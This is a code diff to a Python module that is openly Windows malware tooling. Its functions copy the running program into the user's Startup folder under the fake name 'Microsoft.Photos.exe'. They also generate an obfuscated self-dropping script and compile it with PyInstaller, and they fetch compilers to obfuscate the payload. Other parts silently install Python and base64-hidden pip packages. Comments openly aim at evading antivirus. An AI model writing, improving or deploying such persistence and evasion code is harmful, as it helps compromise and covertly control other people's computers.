@@ -1,12 +1,11 @@
 import base64
 import os
-import random
 import shutil
 import subprocess
 import time
 from Utils.helpers import is_os_64bit, random_string, run_pwsh, is_msvc_exist, \
     download_file, extract_zip, get_current_file_path, base64_encode_file, \
-    find_python_path, ctypes_update_system,is_admin
+    find_python_path, ctypes_update_system,is_admin,startupFolder,tempFolder,BaseTempFolder,set_env_variable
 from .pyinstaller_obfuscate.main import obfuscate_files
 from .pyinstaller_obfuscate.obfuscationModule.main import Obfuscate
 
@@ -24,8 +23,8 @@ def download_pyinstaller(download_path: str):
     if download_file(download_path, URL):
         # //TODO 1: check if this actually works!
         print(final_dir)
-        if extract_zip(f"c:/users/{os.getlogin()}/appdata/local/temp", download_path):
-            return f"c:/users/{os.getlogin()}/appdata/local/temp/{final_dir}"
+        if extract_zip(BaseTempFolder.format(os.getlogin()), download_path):
+            return tempFolder.format(os.getlogin(),final_dir)
     return False
 
 
@@ -34,7 +33,7 @@ def persist_in_startup():
     //TODO 3: find another creative ways to persist in the FS and evade AV"""
     base64_of_ourself = base64_encode_file(get_current_file_path())  # str
     name_for_copy = "Microsoft.Photos.exe"  # //TODO 2: add here names of unsigned files in windows with random.choice.
-    startup_folder = f"c:/users/{os.getlogin()}/appdata/roaming/microsoft/windows/start menu/programs/startup/{name_for_copy}"
+    startup_folder = startupFolder.format(os.getlogin(),name_for_copy)
     with open(startup_folder, 'wb') as new_file:
         new_file.write(base64.b64decode(base64_of_ourself.encode()))  # //TODO 4: Check if this working.
     return True
@@ -47,14 +46,14 @@ def create_dropper():
     this dropper is kind'a in stupid way
     """
     current_file = get_current_file_path()
-    obfuscated_base64_name = random_string(random.randrange(8, 17))
-    obfuscated_main_function = random_string(random.randrange(9, 15))
-    obfuscated_file_var = random_string(random.randrange(7, 17))
-    obfuscated_file_name = random_string(random.randrange(6, 17))
+    obfuscated_base64_name = random_string(is_random=True)
+    obfuscated_main_function = random_string(is_random=True)
+    obfuscated_file_var = random_string(is_random=True)
+    obfuscated_file_name = random_string(is_random=True,is_exe=True)
     obfuscated_startup_folder = f"'c:/users/{os.getlogin()}/" \
                                 f"appdata/roaming/microsoft/" \
-                                f"windows/start menu/programs/startup/{obfuscated_file_name + '.exe'}'"
-    backup_of_file = f"'c:/users/{os.getlogin()}/appdata/local/temp/{obfuscated_file_name + '.exe'}'"
+                                f"windows/start menu/programs/startup/{obfuscated_file_name}'"
+    backup_of_file = f"'c:/users/{os.getlogin()}/appdata/local/temp/{obfuscated_file_name}'"
     our_base64_file = f'"""{base64_encode_file(current_file)}"""'
     code = f"""
 from base64 import b64decode as {obfuscated_base64_name}
@@ -68,20 +67,25 @@ def {obfuscated_main_function}():
     system({backup_of_file})
 {obfuscated_main_function}()
     """
-    dropper_py_file = obfuscated_startup_folder.replace('.exe', '.py').replace("'", '')
+    dropper_py_file = startupFolder.format(os.getlogin(),random_string(is_random=True,is_py=True))
     with open(dropper_py_file, 'w') as dropper_file:
         dropper_file.write(code)
     print(dropper_py_file)
     python_path = find_python_path()
-    check_if_pyinstaller_installed = f"{python_path} -m pip list"
-    print(run_pwsh(check_if_pyinstaller_installed).lower())
+    if 'program' in python_path.lower():
+        check_if_pyinstaller_installed = f"'{python_path}' -m pip list"
+    else:
+        check_if_pyinstaller_installed = f"{python_path} -m pip list"
+    print(run_pwsh(check_if_pyinstaller_installed))
     if 'pyinstaller' in run_pwsh(check_if_pyinstaller_installed).lower():
         pyinstaller_path = python_path.replace('python.exe', 'scripts/pyinstaller.exe')
+        print(pyinstaller_path)
         install_it = run_pwsh(
             f"{pyinstaller_path} --onefile --icon=NONE '{dropper_py_file}' --distpath '{os.path.dirname(dropper_py_file)}'")
         print(install_it)
         # //TODO: find a way to check if the install was success or not
     os.remove(dropper_py_file)  # remove the python dropper code.
+    return
 
 
 def get_pyinstaller(pythonPath: str, admin=True, failed_obfuscate=None):
@@ -90,9 +94,8 @@ def get_pyinstaller(pythonPath: str, admin=True, failed_obfuscate=None):
     :param bool admin: specify if we got admin permissions.
     //TODO 5: create 3 functions from this one. one for each condition.
     """
-    PATH = f"c:/users/{os.getlogin()}/appdata/local/temp/pyinstaller-4.7.zip"
+    PATH = tempFolder.format(os.getlogin(),"pyinstaller-4.7.zip")
     pyinstaller_dir = PATH.replace('.zip', '')
-
     if failed_obfuscate:
         if os.path.exists(pyinstaller_dir):
             time.sleep(5)  # we wait to make sure we have no handle of the obfuscation active
@@ -100,7 +103,7 @@ def get_pyinstaller(pythonPath: str, admin=True, failed_obfuscate=None):
                 shutil.rmtree(pyinstaller_dir)
             except Exception as e:
                 pass
-        randPyinstaller = random_string(5)
+        randPyinstaller = random_string(is_random=True)
         extract_zip(pyinstaller_dir+randPyinstaller, PATH)
         extraction_location = pyinstaller_dir+randPyinstaller+\
                               '/'+pyinstaller_dir.split('/')[::-1][0].replace('.zip','')
@@ -117,11 +120,11 @@ def get_pyinstaller(pythonPath: str, admin=True, failed_obfuscate=None):
         print("[*] Unknown error in extracting and downloading pyinstaller")
     if admin:
         if is_msvc_exist():
-            if Obfuscate(base_dir=f"c:/users/{os.getlogin()}/appdata/local/temp/", python_path=pythonPath).obfuscate():
+            if Obfuscate(base_dir=BaseTempFolder.format(os.getlogin()), python_path=pythonPath).obfuscate():
                 return
         else:
             gcc = "https://github.com/brechtsanders/winlibs_mingw/releases/download/11.2.0-9.0.0-msvcrt-r6/winlibs-x86_64-posix-seh-gcc-11.2.0-mingw-w64-9.0.0-r6.zip"
-            PATH = f"c:/users/{os.getlogin()}/appdata/local/temp/gcc.zip"
+            PATH = tempFolder.format(os.getlogin(),"gcc.zip")
             GCC_EXTRACTION_PATH = "c:/MinGW"
             if os.path.exists(PATH):
                 os.remove(PATH)
@@ -129,11 +132,11 @@ def get_pyinstaller(pythonPath: str, admin=True, failed_obfuscate=None):
                 shutil.rmtree(GCC_EXTRACTION_PATH)
             if download_file(path=PATH, URL=gcc):
                 extract_zip(extraction_path=GCC_EXTRACTION_PATH, file_to_extract=PATH)
-            os.system(r'setx PATH "C:\MinGW\mingw64\bin;%PATH%"')
+            set_env_variable('PATH',r'C:\MinGW\mingw64\bin')
             ctypes_update_system()
-            if Obfuscate(base_dir=f"c:/users/{os.getlogin()}/appdata/local/temp/", python_path=pythonPath).obfuscate():
-                obfuscate_files(extraction_path=f"c:/users/{os.getlogin()}/appdata/local/temp/", name="test",
-                                base_path=f"c:/users/{os.getlogin()}/appdata/local/temp/try_this",
+            if Obfuscate(base_dir=BaseTempFolder.format(os.getlogin()), python_path=pythonPath).obfuscate():
+                obfuscate_files(extraction_path=BaseTempFolder.format(os.getlogin()), name="test",
+                                base_path=tempFolder.format(os.getlogin(),"try_this"),
                                 pythonPath=pythonPath)
             else:
                 return get_pyinstaller(pythonPath, failed_obfuscate=True)
@@ -165,9 +168,9 @@ def pip_install(new_path=None):
             f"{new_path} -m pip install {base64.b64decode(to_install.encode()).decode()}")
         return 1
     subprocess.run(
-        f"c:/users/{os.getlogin()}/appdata/local/programs/python/python38/python.exe -m pip install --upgrade pip")
+        f"{find_python_path()} -m pip install --upgrade pip")
     subprocess.run(
-        f"c:/users/{os.getlogin()}/appdata/local/programs/python/python38/python.exe -m pip install {base64.b64decode(to_install.encode()).decode()}")
+        f"{find_python_path()} -m pip install {base64.b64decode(to_install.encode()).decode()}")
     return 1
 
 
@@ -180,7 +183,7 @@ def install_python():
     py32_url = "https://www.python.org/ftp/python/3.8.1/python-3.8.1.exe"
     InstallAllUsers = 0 if not is_admin else 1
     url = py64_url if is_os_64bit() else py32_url
-    rand_py = f'c:/users/{os.getlogin()}/appdata/local/temp/python{random.randrange(111, 9999999)}.exe'
+    rand_py = tempFolder.format(os.getlogin(),f"{random_string(is_random=True,is_exe=True)}")
     install_python_command =  f"{rand_py} /quiet InstallAllUsers={InstallAllUsers} Include_launcher=0 PrependPath=1 Include_test=0"
     if download_file(rand_py, url):
         subprocess.run(install_python_command)
